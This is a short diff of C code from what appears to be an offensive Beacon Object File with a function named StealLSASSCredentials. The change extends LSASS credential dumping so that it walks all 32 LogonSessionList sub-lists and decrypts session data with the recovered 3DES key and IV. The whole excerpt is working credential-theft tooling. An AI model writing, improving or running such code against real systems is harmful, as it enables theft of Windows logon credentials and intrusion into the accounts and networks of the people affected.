@@ -241,9 +241,15 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
         BeaconPrintf(CALLBACK_OUTPUT, "[+] LogonSessionList found: 0x%llx\n", LogonSessionListHead);
         
         BeaconFormatPrintf(&outputbuffer, "\n===== [ LogonSessionList Information ] =====\n");
-        BeaconFormatPrintf(&outputbuffer, "[i] LogonSessionList: 0x%llx\n\n", LogonSessionListHead);
-        
-        DisplayLogonSessionListInformation(hFile, LogonSessionListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
+        BeaconFormatPrintf(&outputbuffer, "[i] LogonSessionListBase: 0x%llx\n\n", LogonSessionListHead);
+
+        // lsasrv!LogonSessionList is an array of 32 LIST_ENTRY heads (one per auth type).
+        // Iterate all 32 sub-lists; empty ones are skipped automatically.
+        for (int li = 0; li < 32; li++)
+        {
+            DWORD64 SubListHead = LogonSessionListHead + (DWORD64)li * 0x10;
+            DisplayLogonSessionListInformation(hFile, SubListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
+        }
         FreeLibrary(hModule);
     }
 
